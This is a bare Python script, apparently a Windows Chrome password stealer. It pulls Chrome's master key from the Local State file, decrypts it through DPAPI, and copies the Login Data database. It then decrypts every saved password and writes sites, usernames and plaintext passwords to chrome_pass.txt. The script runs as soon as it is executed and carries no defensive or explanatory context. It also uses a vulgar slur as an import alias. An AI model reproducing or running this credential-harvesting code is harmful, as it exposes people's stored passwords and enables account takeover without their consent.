import os
import json
import base64
from sqlite3 import connect as chutiya
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def chrome_get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def chrome_get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def chrome_decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def chrome_pass():

    key = chrome_get_encryption_key()

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")

    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    db = chutiya(filename)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    direc = os. getcwd()
    fileloc = '\chrome_pass.txt'
    fileloc = direc+fileloc
    f = open(fileloc,"w+")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = chrome_decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            f.write(f"Origin URL: {origin_url}")
            f.write(f"Action URL: {action_url}")
            f.write(f"Username: {username}")
            f.write(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            f.write(f"Creation date: {str(chrome_get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            f.write(f"Last Used: {str(chrome_get_chrome_datetime(date_last_used))}")
        f.write("="*50)
    cursor.close()
    db.close()
    f.close()
    try:
        os.remove(filename)
    except:
        pass

chrome_pass()
